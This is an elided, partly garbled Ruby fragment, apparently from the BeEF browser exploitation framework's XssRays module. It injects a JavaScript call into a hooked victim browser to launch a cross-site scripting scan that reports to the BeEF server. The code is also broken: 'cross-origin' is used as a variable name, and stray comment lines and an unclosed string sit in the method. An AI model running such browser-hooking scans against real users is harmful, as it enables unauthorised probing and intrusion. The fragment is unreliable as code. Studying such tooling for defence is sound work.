        ...
        class Scan
          ...
          def start_scan(hb, body)
            ...
            if config.get("beef.http.websocket.enable") && ws.getsocket(hb.session)
              ...
              //   See the file \'doc/COPYING\' for copying permission
              //', "")
              add_to_body xs.id, hb.session, beefurl, cross-origin, timeout
            ...
            print_debug("[XSSRAYS] Adding XssRays to the DOM. Scan id [#{xs.id}], started at [#{xs.scan_start}], cross-origin [#{cross-origin}], clean timeout [#{timeout}].")

          end

          def add_to_body(id, session, beefurl, cross-origin, timeout)
            config = BeEF::Core::Configuration.instance

            req = %Q{
              beef.execute(function() {
                beef.net.xssrays.startScan('#{id}', '#{session}', '#{beefurl}', #{cross-origin}, #{timeout});
              });
            }
